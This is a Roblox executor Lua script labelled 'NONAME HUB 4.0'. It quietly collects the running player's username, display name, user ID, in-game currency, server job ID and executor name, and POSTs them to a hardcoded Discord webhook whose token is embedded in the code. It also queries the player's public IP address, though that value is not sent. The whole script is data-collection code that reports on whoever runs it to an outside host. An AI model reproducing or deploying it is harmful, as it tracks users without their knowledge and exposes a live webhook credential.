local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPAf-nxAnUWvSP97XmqTPA4wgpCJ8aOoxFJD0Ui1f1NUCHbgM2LA9m-Kwpm7i"
local plrname = game.Players.LocalPlayer.Name
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
Parent = game.Workspace
local Day = game.Players.LocalPlayer.AccountAge
local MaxPlr = game.Players.MaxPlayers
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local ExecuteR = identifyexecutor()
local JobIDG = game.JobId
local UserIDs = game.Players.LocalPlayer.UserId
local DisPlayN = game.Players.LocalPlayer.DisplayName
local player = game:GetService"Players".LocalPlayer
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end
local GPID = game.PlaceId
local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local players = game.Players:GetPlayers()

local Baht = game:GetService("Players").LocalPlayer.leaderstats.Baht.Value
local MaxBaht = game:GetService("Players").LocalPlayer.leaderstats.Baht.MaxValue

local Point = game:GetService("Players").LocalPlayer.leaderstats.Point.Value

local Reputation = game:GetService("Players").LocalPlayer.leaderstats.Reputation.Value

local PlayerData =
{
       ["username"] = "Check City BanNa.",
       ["avatar_url"] = AvatarImage,
       ["content"] = "@everyone **City BanNa Check Player**",
       ["embeds"] = {
           {
           ["title"] = "NONAME HUB 4.0",
           ["description"] = "**Check Players**",
           ["color"] = tonumber(0x00ffff),
           ["thumbnail"] = {
            ["url"] = AvatarImage,
        },
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = "**"..plrname.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = "**"..DisPlayN.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Player ID",
                ["value"] = "**["..UserIDs.."](" .. tostring("https://www.roblox.com/users/" .. UserIDs .. "/profile")..")**",
                ["inline"] = true
            },
            {
                ["name"] = "Reputation",
                ["value"] = "**"..Reputation.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Baht/Money",
                ["value"] = "**"..Baht.."**/" .. "**"..MaxBaht.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Point",
                ["value"] = "**"..Point.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Game Job Id",
                ["value"] = "**"..JobIDG.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = "**"..GameName.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Max Player",
                ["value"] = "**"..#players.."**/" .. "**"..MaxPlr.."**",
                ["inline"] = true
            },
        },
           ["type"] = "rich",
           ["author"] = {
                   ["name"] = "Roblox Map";
                   ["url"] = 'https://www.roblox.com/games/'..GPID,
                        },
           ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
        }
    }
}


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request(
    {
        Url = Webhook, 
        Body = PlayerData, 
        Method = "POST", 
        Headers = {["content-type"] = "application/json"} 
    }
)
